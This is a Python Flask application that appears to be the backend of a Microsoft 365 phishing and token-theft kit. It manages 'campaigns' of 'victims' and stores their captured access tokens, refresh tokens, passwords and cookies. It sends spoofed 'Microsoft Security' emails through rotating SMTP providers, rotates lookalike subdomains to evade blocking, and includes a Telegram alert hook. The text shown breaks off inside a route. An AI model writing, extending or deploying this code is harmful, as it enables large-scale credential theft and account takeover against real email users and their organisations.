#!/usr/bin/env python3
import requests
import time
import json
import sqlite3
import threading
import smtplib
import secrets
import re
import subprocess
import random
import csv
import io
import uuid
import logging
import hmac
import hashlib
import base64
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime, timedelta
from flask import Flask, render_template, request, redirect, url_for, jsonify, flash, abort, send_file
from collections import deque
from functools import wraps
import concurrent.futures

# ============================================================
# NAME EXTRACTION FROM EMAIL
# ============================================================
def extract_name_from_email(email):
    """
    Extract first name, last name, and domain from an email address.
    """
    if not email or '@' not in email:
        return {'first_name': '', 'last_name': '', 'domain': '', 'email': email}
    
    local_part, domain = email.split('@')
    
    # Clean the local part (remove numbers, special chars except dots/underscores)
    clean = re.sub(r'[^a-zA-Z._-]', '', local_part)
    
    # Split by dot, underscore, or dash
    parts = re.split(r'[._-]+', clean)
    
    # Filter out empty parts
    parts = [p for p in parts if p]
    
    first_name = ''
    last_name = ''
    
    if len(parts) == 1:
        first_name = parts[0].capitalize()
    elif len(parts) >= 2:
        first_name = parts[0].capitalize()
        last_name = parts[-1].capitalize()
    
    return {
        'first_name': first_name,
        'last_name': last_name,
        'domain': domain,
        'email': email
    }

# ============================================================
# RATE LIMITER
# ============================================================
class RateLimiter:
    """Simple rate limiter to avoid SMTP blocks."""
    def __init__(self, max_per_minute=60):
        self.max_per_minute = max_per_minute
        self.timestamps = deque()
        self.lock = threading.Lock()
    
    def wait_if_needed(self):
        """Wait if we've exceeded the rate limit."""
        with self.lock:
            now = time.time()
            while self.timestamps and now - self.timestamps[0] > 60:
                self.timestamps.popleft()
            
            if len(self.timestamps) >= self.max_per_minute:
                sleep_time = 60 - (now - self.timestamps[0])
                if sleep_time > 0:
                    time.sleep(sleep_time + 0.5)
            
            self.timestamps.append(time.time())

rate_limiter = RateLimiter(max_per_minute=60)

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

# ============================================================
# CONFIGURATION
# ============================================================
# CLIENT_ID is now read from database via get_setting("oauth_client_id")
# TENANT_ID is now read from database via get_setting("oauth_tenant_id")
# SCOPES is now read from database via get_setting("oauth_scopes")
# Default fallback: User.Read offline_access
# TELEGRAM_BOT_TOKEN is now read from database via get_setting("telegram_bot_token")
# TELEGRAM_CHAT_ID is now read from database via get_setting("telegram_chat_id")
DB_FILE = "/root/eviltoken/tokens.db"
ADMIN_HOST = "admin.microsoftonline-auth.us"
ALLOWED_HOSTS = ["admin.microsoftonline-auth.us", "secure.dltufurniture.com", "login.microsoftonline-auth.us"]
CAPTURE_SECRET = "MySuperSecret123!"
progress_store = {}

WORKER_DOMAINS = [
    "https://login.rudsek.com",
    "https://login.mcdonalds-restaraunt.com",
    "https://login.centraescrowgroup.com",
    "https://login.futuraimp.com",
    "https://login.heart-medla.com",
    "https://login.yacheingheart-medla.com"
]

# ============================================================
# SUBDOMAINS
# ============================================================
# SUBDOMAINS is now dynamically loaded from database
# The global SUBDOMAINS is only used as fallback
SUBDOMAINS = ["auth", "secure", "login", "verify", "account", "portal", "office", "outlook", "help", "support", "docs", "teams"]

def get_subdomains_from_db():
    """Get subdomains from database or fallback to hardcoded"""
    try:
        conn = get_db()
        row = conn.execute("SELECT value FROM settings WHERE key = 'subdomains_list'").fetchone()
        conn.close()
        if row and row['value']:
            return row['value'].split(',')
    except:
        pass
    return SUBDOMAINS

def rotate_subdomain():
    """Rotate to the next subdomain"""
    conn = get_db()
    
    # Get subdomains from database
    subdomains = get_subdomains_from_db()
    
    row = conn.execute("SELECT value FROM settings WHERE key = 'subdomain_index'").fetchone()
    current_idx = int(row['value']) if row else 0
    next_idx = (current_idx + 1) % len(subdomains)
    new_subdomain = subdomains[next_idx]
    
    # Get domain from base_url
    base_url_row = conn.execute("SELECT value FROM settings WHERE key = 'base_url'").fetchone()
    if base_url_row and base_url_row['value']:
        domain_part = base_url_row['value'].replace('https://', '').split('.')
        if len(domain_part) > 1:
            domain = '.'.join(domain_part[1:])
        else:
            domain = 'dltufurniture.com'
    else:
        domain = 'dltufurniture.com'
    
    new_base_url = f"https://{new_subdomain}.{domain}"
    conn.execute("UPDATE settings SET value = ? WHERE key = 'subdomain_index'", (str(next_idx),))
    conn.execute("UPDATE settings SET value = ? WHERE key = 'current_subdomain'", (new_subdomain,))
    conn.execute("UPDATE settings SET value = ? WHERE key = 'base_url'", (new_base_url,))
    conn.commit()
    conn.close()
    app.logger.info(f"🔄 Subdomain rotated to: {new_subdomain} ({new_base_url})")
    return new_base_url

# ============================================================
# DATABASE HELPERS
# ============================================================
def get_db():
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.execute('''CREATE TABLE IF NOT EXISTS campaigns (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT,
        created_at TEXT,
        status TEXT DEFAULT 'active',
        worker_redirect INTEGER DEFAULT 0
    )''')
    conn.execute('''CREATE TABLE IF NOT EXISTS victims (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        campaign_id INTEGER,
        email TEXT,
        first_name TEXT,
        last_name TEXT,
        company TEXT,
        code TEXT,
        token TEXT UNIQUE,
        access_token TEXT,
        refresh_token TEXT,
        captured_at TEXT,
        custom_link TEXT,
        FOREIGN KEY(campaign_id) REFERENCES campaigns(id)
    )''')
    conn.execute('''CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY,
        value TEXT
    )''')
    conn.execute('''CREATE TABLE IF NOT EXISTS templates (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT,
        subject TEXT,
        body TEXT,
        type TEXT,
        created_at TEXT
    )''')
    conn.execute('''CREATE TABLE IF NOT EXISTS activities (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        event_type TEXT,
        message TEXT,
        created_at TEXT
    )''')
    conn.execute('''CREATE TABLE IF NOT EXISTS captured_creds (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id INTEGER,
        username TEXT,
        password TEXT,
        captured_at TEXT,
        FOREIGN KEY(victim_id) REFERENCES victims(id)
    )''')
    conn.execute('''CREATE TABLE IF NOT EXISTS captured_cookies (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id INTEGER,
        cookie_name TEXT,
        cookie_value TEXT,
        domain TEXT,
        secure INTEGER,
        expires_at TEXT,
        captured_at TEXT,
        FOREIGN KEY(victim_id) REFERENCES victims(id)
    )''')
    conn.execute('''CREATE TABLE IF NOT EXISTS smtp_providers (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT,
        server TEXT,
        port INTEGER,
        username TEXT,
        password TEXT,
        from_email TEXT,
        enabled INTEGER DEFAULT 1,
        created_at TEXT,
        success_count INTEGER DEFAULT 0,
        fail_count INTEGER DEFAULT 0,
        score INTEGER DEFAULT 100
    )''')
    
    # Add missing columns
    try:
        conn.execute("ALTER TABLE campaigns ADD COLUMN worker_redirect INTEGER DEFAULT 0")
    except: pass
    
    try:
        conn.execute("ALTER TABLE smtp_providers ADD COLUMN success_count INTEGER DEFAULT 0")
    except: pass
    
    try:
        conn.execute("ALTER TABLE smtp_providers ADD COLUMN fail_count INTEGER DEFAULT 0")
    except: pass
    
    try:
        conn.execute("ALTER TABLE smtp_providers ADD COLUMN score INTEGER DEFAULT 100")
    except: pass
    
    defaults = [
        ('smtp_server', 'smtp.office365.com'),
        ('smtp_port', '587'),
        ('smtp_username', ''),
        ('smtp_password', ''),
        ('smtp_from', ''),
        ('sender_name', 'Microsoft Security'),
        ('base_url', 'https://login.microsoftonline-auth.us'),
        ('openai_api_key', ''),
        ('enable_ai_lures', 'false'),
        ('max_workers', '5'),
        ('rate_limit_per_minute', '60'),
        ('enable_webhooks', 'true'),
    ]
    for k, v in defaults:
        conn.execute("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)", (k, v))
    conn.commit()
    conn.close()

init_db()

# ============================================================
# SMTP FUNCTIONS
# ============================================================
class SmartSMTPRotator:
    def __init__(self):
        self.provider_cache = None
        self.cache_time = 0
        self.cache_ttl = 60
    
    def get_providers(self):
        if not self.provider_cache or (time.time() - self.cache_time) > self.cache_ttl:
            conn = get_db()
            providers = conn.execute("SELECT * FROM smtp_providers WHERE enabled = 1 ORDER BY score DESC").fetchall()
            conn.close()
            self.provider_cache = [dict(p) for p in providers]
            self.cache_time = time.time()
        return self.provider_cache
    
    def get_best_provider(self):
        providers = self.get_providers()
        if not providers:
            return None
        available = [p for p in providers if p['score'] > 0]
        if not available:
            available = providers
        return random.choice(available) if available else None
    
    def update_score(self, provider_id, success):
        conn = get_db()
        provider = conn.execute("SELECT score FROM smtp_providers WHERE id = ?", (provider_id,)).fetchone()
        if provider:
            new_score = provider['score']
            if success:
                new_score = min(100, new_score + 2)
                conn.execute("UPDATE smtp_providers SET score = ?, success_count = success_count + 1 WHERE id = ?", (new_score, provider_id))
            else:
                new_score = max(0, new_score - 5)
                conn.execute("UPDATE smtp_providers SET score = ?, fail_count = fail_count + 1 WHERE id = ?", (new_score, provider_id))
            conn.commit()
        conn.close()
        self.provider_cache = None

smtp_rotator = SmartSMTPRotator()

def get_smtp_providers(enabled_only=True):
    conn = get_db()
    if enabled_only:
        providers = conn.execute("SELECT * FROM smtp_providers WHERE enabled = 1 ORDER BY score DESC").fetchall()
    else:
        providers = conn.execute("SELECT * FROM smtp_providers ORDER BY id").fetchall()
    conn.close()
    return providers

def get_next_smtp():
    """Get the best SMTP provider based on scoring"""
    provider = smtp_rotator.get_best_provider()
    if not provider:
        # Fallback to base SMTP settings from database
        smtp_server = get_setting('smtp_server')
        smtp_port = get_setting('smtp_port')
        smtp_username = get_setting('smtp_username')
        smtp_password = get_setting('smtp_password')
        smtp_from = get_setting('smtp_from')
        
        if smtp_server and smtp_username and smtp_password:
            return {
                'server': smtp_server,
                'port': int(smtp_port or 587),
                'username': smtp_username,
                'password': smtp_password,
                'from': smtp_from or smtp_username,
                'name': 'Base SMTP',
                'source': 'base'
            }
        
        # No SMTP configured at all
        app.logger.error("❌ No SMTP providers configured!")
        return None
    return {
        'server': provider.get('server'),
        'port': provider.get('port'),
        'username': provider.get('username'),
        'password': provider.get('password'),
        'from': provider.get('from_email'),
        'name': provider.get('name'),
        'id': provider.get('id')
    }

# ============================================================
# HELPER FUNCTIONS
# ============================================================
def get_setting(key):
    conn = get_db()
    row = conn.execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()
    conn.close()
    return row['value'] if row else None

def set_setting(key, value):
    conn = get_db()
    conn.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
    conn.commit()
    conn.close()

def send_telegram(message):
    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
        try:
            requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                          json={"chat_id": TELEGRAM_CHAT_ID, "text": message}, timeout=10)
        except: pass

def admin_only(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        # Check if it's a browser request (has typical browser User-Agent)
        user_agent = request.headers.get('User-Agent', '').lower()
        is_browser = any(browser in user_agent for browser in ['mozilla', 'chrome', 'safari', 'firefox', 'edge', 'opera', 'msie'])
        
        # Check 1: If host is in ALLOWED_HOSTS AND NOT a browser (API access)
        if request.host in ALLOWED_HOSTS and not is_browser:
            return f(*args, **kwargs)
        
        # Check 2: Session-based authentication (browser access - password required)
        try:
            if current_user.is_authenticated and current_user.role == 'admin':
                return f(*args, **kwargs)
        except:
            pass
        
        # If neither, redirect to login page
        flash('Please login to access this page.', 'warning')
        return redirect(url_for('login_page'))
    return decorated



def log_activity(event_type, message):
    conn = get_db()
    conn.execute(
        "INSERT INTO activities (event_type, message, created_at) VALUES (?, ?, ?)",
        (event_type, message, datetime.now().isoformat())
    )
    conn.commit()
    conn.close()

# ============================================================
# EMAIL FUNCTIONS
# ============================================================
def send_email(to_email, subject, html_body, plain_text=None, victim_data=None):
    """Send email - ALWAYS use get_next_smtp() which handles rotation logic"""
    
    smtp = get_next_smtp()
    
    app.logger.info(f"📧 Using SMTP source: {smtp.get('source', 'unknown')} - {smtp.get('name', 'unnamed')}")
    
    rate_limiter.wait_if_needed()
    
    try:
        msg = MIMEMultipart('alternative')
        sender_name = get_setting('sender_name') or 'Microsoft Security'
        
        # REPLACE PLACEHOLDERS IN SENDER NAME
        if victim_data:
            # Get values
            first_name = str(victim_data.get('first_name', '') or '')
            last_name = str(victim_data.get('last_name', '') or '')
            email = str(victim_data.get('email', '') or '')
            company = str(victim_data.get('company', '') or '')
            
            # Extract company from email if not set
            if not company and email and '@' in email:
                domain = email.split('@')[1]
                company = domain.split('.')[0].capitalize() if domain else ''
            
            # Extract domain
            domain = ''
            if email and '@' in email:
                domain = email.split('@')[1]
            
            # Replace ALL placeholders
            sender_name = sender_name.replace('{first_name}', first_name)
            sender_name = sender_name.replace('{last_name}', last_name)
            sender_name = sender_name.replace('{email}', email)
            sender_name = sender_name.replace('{company}', company)
            sender_name = sender_name.replace('{domain}', domain)
            
            app.logger.info(f"📧 Sender name after replacement: {sender_name}")
        
        msg['From'] = f"{sender_name} <{smtp['from']}>"
        msg['To'] = to_email
        msg['Subject'] = subject
        msg['Reply-To'] = smtp['from']
        msg['X-Mailer'] = 'Microsoft 365 Security'
        
        if plain_text:
            part1 = MIMEText(plain_text, 'plain')
            msg.attach(part1)
        
        part2 = MIMEText(html_body, 'html')
        msg.attach(part2)
        
        server = smtplib.SMTP(smtp['server'], smtp['port'], timeout=30)
        server.ehlo()
        if smtp['port'] in (587, 465):
            server.starttls()
            server.ehlo()
        server.login(smtp['username'], smtp['password'])
        server.send_message(msg)
        server.quit()
        
        if smtp.get('id') and smtp.get('source') == 'rotation':
            smtp_rotator.update_score(smtp['id'], True)
        
        log_activity('email_sent', f"Sent via {smtp['name']} ({smtp.get('source', 'unknown')}) to {to_email}")
        return True, "Sent"
        
    except Exception as e:
        error_msg = str(e)
        
        if smtp.get('id') and smtp.get('source') == 'rotation':
            smtp_rotator.update_score(smtp['id'], False)
        
        log_activity('email_failed', f"Failed via {smtp['name']} to {to_email}: {error_msg}")
        return False, error_msg

def render_email_template(template_body, victim_data, link):
    replacements = {
        '{first_name}': victim_data.get('first_name', ''),
        '{last_name}': victim_data.get('last_name', ''),
        '{email}': victim_data.get('email', ''),
        '{company}': victim_data.get('company', ''),
        '{link}': link
    }
    for key, value in replacements.items():
        template_body = template_body.replace(key, str(value) if value else '')
    return template_body

# ============================================================
# EMAIL SENDING
# ============================================================
def send_single_email(victim_data, template, base_url):
    try:
        victim = {
            'first_name': victim_data['first_name'] or '',
            'last_name': victim_data['last_name'] or '',
            'email': victim_data['email'],
            'company': victim_data['company'] or '',
        }
        
        if victim_data.get('custom_link'):
            link = victim_data['custom_link']
        else:
            link = f"{base_url}/c/{victim_data['token']}"
        
        html_body = render_email_template(template['body'], victim, link)
        subject = template['subject']
        
        # Pass victim data for placeholder replacement in FROM name
        success, msg = send_email(victim['email'], subject, html_body, victim_data=victim)
        
        return {
            'victim_id': victim_data['id'], 
            'email': victim['email'],
            'success': success, 
            'error': msg if not success else None
        }
    except Exception as e:
        return {
            'victim_id': victim_data['id'],
            'email': victim_data['email'],
            'success': False, 
            'error': str(e)
        }

def send_emails_async(campaign_id, template_id, job_id):
    logger.info(f"🔥 Job {job_id} started for campaign {campaign_id}")
    logger.info(f"📝 Template ID provided: {template_id}")
    
    # Auto-rotate subdomain if enabled
    try:
        conn = get_db()
        rotation_enabled = conn.execute("SELECT value FROM settings WHERE key = 'rotation_enabled'").fetchone()
        conn.close()
        if rotation_enabled and rotation_enabled['value'] == '1':
            try:
                new_base_url = rotate_subdomain()
                if new_base_url:
                    logger.info(f"🔄 Auto-rotated to: {new_base_url}")
                else:
                    logger.warning("⚠️ Auto-rotation failed")
            except Exception as e:
                logger.error(f"❌ Auto-rotation failed: {e}")
    except Exception as e:
        logger.error(f"❌ Rotation check failed: {e}")
    
    try:
        progress_store[job_id] = {
            'total': 0,
            'sent': 0,
            'failed': 0,
            'status': 'processing'
        }
        
        conn = get_db()
        
        campaign = conn.execute("SELECT status FROM campaigns WHERE id = ?", (campaign_id,)).fetchone()
        logger.info(f"📊 Campaign {campaign_id} status: {campaign['status'] if campaign else 'Unknown'}")
        
        if campaign and campaign['status'] in ('paused', 'cancelled'):
            progress_store[job_id]['status'] = campaign['status']
            conn.close()
            logger.warning(f"⚠️ Campaign {campaign_id} is {campaign['status']}")
            return
        
        logger.info(f"📊 Querying victims for campaign {campaign_id}...")
        victims = conn.execute(
            "SELECT * FROM victims WHERE campaign_id=? AND access_token IS NULL", 
            (campaign_id,)
        ).fetchall()
        
        total = len(victims)
        logger.info(f"📊 Found {total} victims in campaign {campaign_id}")
        progress_store[job_id]['total'] = total
        
        if total == 0:
            progress_store[job_id]['status'] = 'no_victims'
            logger.warning(f"⚠️ No pending victims found for campaign {campaign_id}")
            conn.close()
            return
        
        logger.info(f"📄 Looking for template...")
        template = None
        
        if template_id and template_id != '':
            logger.info(f"📄 Using specific template ID: {template_id}")
            templates = conn.execute("SELECT * FROM templates WHERE id=?", (template_id,)).fetchall()
            template = templates[0] if templates else None
            if template:
                logger.info(f"✅ Found template: {template['name']} (ID: {template['id']})")
            else:
                logger.warning(f"⚠️ Template ID {template_id} not found, falling back to random")
        
        if not template:
            logger.info("📄 No specific template, selecting random...")
            templates = conn.execute("SELECT * FROM templates").fetchall()
            template = random.choice(templates) if templates else None
            if template:
                logger.info(f"✅ Selected random template: {template['name']} (ID: {template['id']})")
        
        conn.close()
        
        if not template:
            progress_store[job_id]['status'] = 'no_templates'
            logger.error("❌ No templates found in database!")
            return
        
        logger.info(f"📄 Using template: {template['name']} (Subject: {template['subject']})")
        
        # Get the latest base_url after rotation
        base_url = get_setting('base_url')
        if not base_url:
            base_url = get_setting('base_url') or 'https://auth.dltufurniture.com'
            app.logger.warning("⚠️ base_url not found, using default")
        max_workers = int(get_setting('max_workers') or 5)
        app.logger.info(f"📧 Using base URL: {base_url}")
        
        sent = 0
        failed = 0
        victim_list = [dict(v) for v in victims]
        
        logger.info(f"📤 Sending {total} emails with {max_workers} workers...")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(send_single_email, v, template, base_url) for v in victim_list]
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result['success']:
                    sent += 1
                    logger.info(f"✅ Sent to {result['email']}")
                else:
                    failed += 1
                    logger.error(f"❌ Failed to send to {result['email']}: {result['error']}")
                
                progress_store[job_id]['sent'] = sent
                progress_store[job_id]['failed'] = failed
        
        logger.info(f"📊 Send complete: {sent} sent, {failed} failed")
        
        conn = get_db()
        conn.execute("UPDATE campaigns SET status='active' WHERE id=?", (campaign_id,))
        conn.commit()
        conn.close()
        
        progress_store[job_id]['status'] = 'completed'
        log_activity('emails_sent', f"Sent {sent} emails for campaign {campaign_id}")
        logger.info(f"✅ Job {job_id} completed. Sent {sent}, failed {failed}")
        
    except Exception as e:
        progress_store[job_id]['status'] = f'error: {str(e)}'
        logger.error(f"❌ Error in send_emails_async: {e}")
        import traceback
        traceback.print_exc()

# ============================================================
# ROUTES
# ============================================================

@app.route('/')
def index():
    user_agent = request.headers.get('User-Agent', '').lower()
    is_browser = any(browser in user_agent for browser in ['mozilla', 'chrome', 'safari', 'firefox', 'edge', 'opera', 'msie'])
    
    if request.host in ALLOWED_HOSTS and not is_browser:
        return redirect(url_for('dashboard'))
    
    return redirect(url_for('login_page'))

# ============================================================
# ADMIN DASHBOARD
# ============================================================
@app.route('/admin')
@admin_only
def dashboard():
    conn = get_db()
    campaigns_raw = conn.execute("SELECT * FROM campaigns ORDER BY id DESC").fetchall()
    victims = conn.execute("SELECT * FROM victims ORDER BY id DESC LIMIT 20").fetchall()
    
    campaigns = []
    for c in campaigns_raw:
        c_dict = dict(c)
        cnt = conn.execute("SELECT COUNT(*) FROM victims WHERE campaign_id=?", (c['id'],)).fetchone()[0]
        cap = conn.execute("SELECT COUNT(*) FROM victims WHERE campaign_id=? AND access_token IS NOT NULL", (c['id'],)).fetchone()[0]
        c_dict['victim_count'] = cnt
        c_dict['captured_count'] = cap
        campaigns.append(c_dict)
    
    total_victims = conn.execute("SELECT COUNT(*) FROM victims").fetchone()[0]
    captured_victims = conn.execute("SELECT COUNT(*) FROM victims WHERE access_token IS NOT NULL").fetchone()[0]
    activities = conn.execute("SELECT * FROM activities ORDER BY id DESC LIMIT 10").fetchall()
    conn.close()
    
    return render_template('dashboard.html',
                           campaigns=campaigns,
                           victims=victims,
                           total_victims=total_victims,
                           captured_count=captured_victims,
                           activities=activities,
                           is_admin=True)

# ============================================================
# SETTINGS PAGE
# ============================================================
@app.route('/settings', methods=['GET', 'POST'])
@admin_only
def settings():
    if request.method == 'POST':
        for key in ['smtp_server', 'smtp_port', 'smtp_username', 'smtp_password', 
                    'smtp_from', 'sender_name', 'base_url', 'openai_api_key', 
                    'enable_ai_lures', 'max_workers', 'rate_limit_per_minute']:
            set_setting(key, request.form.get(key, ''))
        flash("Settings saved!", "success")
        return redirect(url_for('settings'))
    
    conn = get_db()
    smtp_providers = conn.execute("SELECT * FROM smtp_providers ORDER BY score DESC").fetchall()
    conn.close()
    
    settings = {}
    keys = ['smtp_server', 'smtp_port', 'smtp_username', 'smtp_password', 
            'smtp_from', 'sender_name', 'base_url', 'openai_api_key', 
            'enable_ai_lures', 'max_workers', 'rate_limit_per_minute']
    
    for key in keys:
        settings[key] = get_setting(key) or ''
    
    # Subdomain settings
    settings['current_subdomain'] = get_setting('current_subdomain') or 'auth'
    settings['subdomain_index'] = get_setting('subdomain_index') or '0'
    settings['rotation_enabled'] = get_setting('rotation_enabled') or '1'
    settings['subdomains_list'] = get_setting('subdomains_list') or 'auth,secure,login,verify,account,portal,office,outlook,help,support,docs,teams'
    
    return render_template('settings.html', 
                          settings=settings, 
                          smtp_providers=smtp_providers, 
                          is_admin=True)

# ============================================================
# SUBDOMAIN ROTATION ROUTES
# ============================================================
@app.route('/api/subdomain_status')
@admin_only
def subdomain_status():
    """Get current subdomain status as JSON"""
    conn = get_db()
    current_subdomain = conn.execute("SELECT value FROM settings WHERE key = 'current_subdomain'").fetchone()
    base_url = conn.execute("SELECT value FROM settings WHERE key = 'base_url'").fetchone()
    subdomain_index = conn.execute("SELECT value FROM settings WHERE key = 'subdomain_index'").fetchone()
    rotation_enabled = conn.execute("SELECT value FROM settings WHERE key = 'rotation_enabled'").fetchone()
    conn.close()
    
    return jsonify({
        'current_subdomain': current_subdomain['value'] if current_subdomain else 'auth',
        'base_url': base_url['value'] if base_url else 'https://auth.dltufurniture.com',
        'subdomain_index': subdomain_index['value'] if subdomain_index else '0',
        'rotation_enabled': int(rotation_enabled['value']) if rotation_enabled else 1
    })

@app.route('/toggle_rotation', methods=['POST'])
@admin_only
def toggle_rotation():
    try:
        conn = get_db()
        current = conn.execute("SELECT value FROM settings WHERE key = 'rotation_enabled'").fetchone()
        if current:
            new_value = '0' if current['value'] == '1' else '1'
        else:
            new_value = '1'
        conn.execute("UPDATE settings SET value = ? WHERE key = 'rotation_enabled'", (new_value,))
        conn.commit()
        conn.close()
        status = "ENABLED" if new_value == '1' else "DISABLED"
        flash(f"🔄 Auto-rotation {status}", "success")
    except Exception as e:
        flash(f"❌ Error: {str(e)}", "danger")
    return redirect(url_for('settings'))

@app.route('/rotate_now')
@admin_only
def rotate_now():
    try:
        new_base_url = rotate_subdomain()
        flash(f"🔄 Subdomain rotated to: {new_base_url}", "success")
    except Exception as e:
        flash(f"❌ Error: {str(e)}", "danger")
    return redirect(url_for('settings'))

@app.route('/set_subdomain', methods=['POST'])
@admin_only
def set_subdomain():
    subdomain = request.form.get('subdomain')
    if not subdomain or subdomain not in SUBDOMAINS:
        flash("❌ Invalid subdomain", "danger")
        return redirect(url_for('settings'))
    new_base_url = f"https://{subdomain}.dltufurniture.com"
    conn = get_db()
    conn.execute("UPDATE settings SET value = ? WHERE key = 'base_url'", (new_base_url,))
    conn.execute("UPDATE settings SET value = ? WHERE key = 'current_subdomain'", (subdomain,))
    try:
        idx = SUBDOMAINS.index(subdomain)
        conn.execute("UPDATE settings SET value = ? WHERE key = 'subdomain_index'", (str(idx),))
    except:
        pass
    conn.commit()
    conn.close()
    flash(f"✅ Subdomain set to: {subdomain}", "success")
    return redirect(url_for('settings'))

# ============================================================
# CAMPAIGN ROUTES
# ============================================================
@app.route('/campaigns')
@admin_only
def campaigns_page():
    conn = get_db()
    campaigns = conn.execute("SELECT * FROM campaigns ORDER BY id DESC").fetchall()
    campaigns_list = []
    for c in campaigns:
        cnt = conn.execute("SELECT COUNT(*) FROM victims WHERE campaign_id=?", (c['id'],)).fetchone()[0]
        cap = conn.execute("SELECT COUNT(*) FROM victims WHERE campaign_id=? AND access_token IS NOT NULL", (c['id'],)).fetchone()[0]
        c_dict = dict(c)
        c_dict['victim_count'] = cnt
        c_dict['captured_count'] = cap
        campaigns_list.append(c_dict)
    conn.close()
    return render_template('campaigns.html', campaigns=campaigns_list, is_admin=True)

@app.route('/campaign/<int:campaign_id>/detail')
@admin_only
def campaign_detail(campaign_id):
    conn = get_db()
    campaign = conn.execute("SELECT * FROM campaigns WHERE id=?", (campaign_id,)).fetchone()
    if not campaign:
        flash("Campaign not found.", "danger")
        return redirect(url_for('dashboard'))
    
    # Get victims with click counts
    victims = conn.execute("""
        SELECT v.*, 
               (SELECT COUNT(*) FROM worker_click_logs WHERE victim_id = v.id) as click_count
        FROM victims v 
        WHERE v.campaign_id = ? 
        ORDER BY v.id DESC
    """, (campaign_id,)).fetchall()
    templates = conn.execute("SELECT * FROM templates").fetchall()
    total = len(victims)
    captured = sum(1 for v in victims if v['access_token'])
    pending = total - captured
    conn.close()
    
    return render_template('campaign_detail.html',
                           campaign=campaign,
                           victims=victims,
                           templates=templates,
                           total=total,
                           captured=captured,
                           pending=pending,
                           is_admin=True)

@app.route('/campaign/<int:campaign_id>/add_emails', methods=['POST'])
@admin_only
def add_emails(campaign_id):
    emails_input = request.form.get('emails', '')
    csv_file = request.files.get('csv_file')
    victims_data = []
    
    if csv_file and csv_file.filename.endswith('.csv'):
        content = csv_file.stream.read().decode('utf-8', errors='ignore')
        app.logger.info(f"📄 Processing CSV: {csv_file.filename}")
        
        import re
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        all_emails = re.findall(email_pattern, content)
        seen_emails = set()
        unique_emails = []
        for email in all_emails:
            if email not in seen_emails:
                seen_emails.add(email)
                unique_emails.append(email)
        
        if not unique_emails:
            flash("No valid email addresses found in the CSV file.", "danger")
            return redirect(url_for('campaign_detail', campaign_id=campaign_id))
        
        for email in unique_emails:
            name_data = extract_name_from_email(email)
            domain = email.split('@')[1] if '@' in email else ''
            victims_data.append({
                'email': email,
                'first_name': name_data['first_name'],
                'last_name': name_data['last_name'],
                'company': domain,
                'custom_link': ''
            })
        
        app.logger.info(f"✅ Found {len(victims_data)} victims in CSV")
    
    else:
        for line in emails_input.splitlines():
            email = line.strip()
            if email:
                name_data = extract_name_from_email(email)
                victims_data.append({
                    'email': email,
                    'first_name': name_data['first_name'],
                    'last_name': name_data['last_name'],
                    'company': '',
                    'custom_link': ''
                })
    
    if not victims_data:
        flash("No valid email addresses found.", "danger")
        return redirect(url_for('campaign_detail', campaign_id=campaign_id))
    
    conn = get_db()
    cursor = conn.cursor()
    for v in victims_data:
        token = secrets.token_urlsafe(8)
        cursor.execute("""
            INSERT INTO victims (campaign_id, email, first_name, last_name, company, token, captured_at, custom_link)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        """, (campaign_id, v['email'], v.get('first_name', ''), v.get('last_name', ''), v.get('company', ''), token, None, v.get('custom_link', '')))
    conn.commit()
    conn.close()
    
    log_activity('victims_added', f"Added {len(victims_data)} victims to campaign {campaign_id}")
    flash(f"✅ Added {len(victims_data)} new victims.", "success")
    return redirect(url_for('campaign_detail', campaign_id=campaign_id))

@app.route('/campaign/<int:campaign_id>/send_async', methods=['POST'])
@admin_only
def send_async(campaign_id):
    template_id = request.form.get('template_id')
    job_id = str(uuid.uuid4())
    thread = threading.Thread(target=send_emails_async, args=(campaign_id, template_id, job_id))
    thread.daemon = True
    thread.start()
    return jsonify({'job_id': job_id})

# ============================================================
# CAMPAIGN ACTION ROUTES
# ============================================================
@app.route('/campaign/<int:campaign_id>/pause', methods=['POST'])
@admin_only
def pause_campaign(campaign_id):
    conn = get_db()
    conn.execute("UPDATE campaigns SET status = 'paused' WHERE id = ?", (campaign_id,))
    conn.commit()
    conn.close()
    log_activity('campaign_paused', f"Campaign {campaign_id} paused")
    flash("⏸️ Campaign paused.", "success")
    return redirect(url_for('campaign_detail', campaign_id=campaign_id))

@app.route('/campaign/<int:campaign_id>/resume', methods=['POST'])
@admin_only
def resume_campaign(campaign_id):
    conn = get_db()
    conn.execute("UPDATE campaigns SET status = 'active' WHERE id = ?", (campaign_id,))
    conn.commit()
    conn.close()
    log_activity('campaign_resumed', f"Campaign {campaign_id} resumed")
    flash("▶️ Campaign resumed and reactivated.", "success")
    return redirect(url_for('campaign_detail', campaign_id=campaign_id))

@app.route('/campaign/<int:campaign_id>/cancel', methods=['POST'])
@admin_only
def cancel_campaign(campaign_id):
    conn = get_db()
    conn.execute("UPDATE campaigns SET status = 'cancelled' WHERE id = ?", (campaign_id,))
    conn.commit()
    conn.close()
    log_activity('campaign_cancelled', f"Campaign {campaign_id} cancelled")
    flash("⏹️ Campaign cancelled. You can resume it later.", "success")
